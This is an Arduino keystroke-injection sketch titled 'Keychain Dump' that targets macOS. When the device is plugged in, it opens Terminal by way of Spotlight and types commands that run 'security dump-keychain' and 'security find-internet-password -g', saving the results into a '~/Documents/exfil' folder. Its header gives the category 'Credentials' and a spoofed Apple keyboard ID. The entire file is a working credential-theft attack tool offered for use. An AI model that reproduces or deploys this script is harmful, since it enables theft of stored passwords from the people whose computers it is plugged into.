#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Dump keychain passwords (triggers auth prompt for each)
  // Saves to ~/Documents/exfil/keychain.txt
  // Author: Generated
  // Title: Keychain Dump
  // Target: macOS
  // Version: 1.0
  // Category: Credentials
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("security dump-keychain > ~/Documents/exfil/keychain_dump.txt 2>&1");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("security find-internet-password -g > ~/Documents/exfil/keychain_passwords.txt 2>&1");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("ls -la ~/Documents/exfil/");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}